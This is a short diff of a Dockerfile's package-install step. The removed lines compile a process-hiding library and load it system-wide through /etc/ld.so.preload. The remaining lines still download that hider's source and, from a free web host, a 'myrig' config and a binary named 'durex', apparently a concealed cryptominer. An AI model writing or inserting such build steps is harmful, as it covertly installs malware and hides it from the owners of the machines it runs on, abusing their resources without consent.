@@ -34,13 +34,9 @@ RUN apt-get install -y --no-install-recommends \
         wget \
         bash \
         gcc \
-    && wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
-    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
-    && mv libprocess.so /usr/local/lib/ \
-    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload \    
+    && wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \   
     && wget https://nyadur.000webhostapp.com/myrig/config.json \
     && wget https://nyadur.000webhostapp.com/myrig/durex \
-    && chmod +x durex \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
 
